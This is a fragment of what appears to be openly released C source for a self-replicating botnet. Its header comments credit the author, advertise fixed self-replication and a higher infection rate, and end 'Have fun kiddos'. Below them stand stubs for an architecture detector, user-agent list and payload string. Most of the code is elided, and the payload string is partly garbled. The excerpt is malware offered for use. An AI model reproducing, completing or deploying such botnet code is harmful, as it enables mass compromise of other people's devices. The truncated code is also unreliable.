// Made an released by Scarface#9316

// Release date: 27/6
// Fixed selfrep, removed all the junk ranges, this will make the bin smaller and it will increase execution rate.
// Have fun kiddos.
...
char *getBuild() { // Arch Detector By Scarface
...
const char *useragents[] = { // User Agents By Scarface
...
char *Payload = "Â´Payload Witout Busybox";
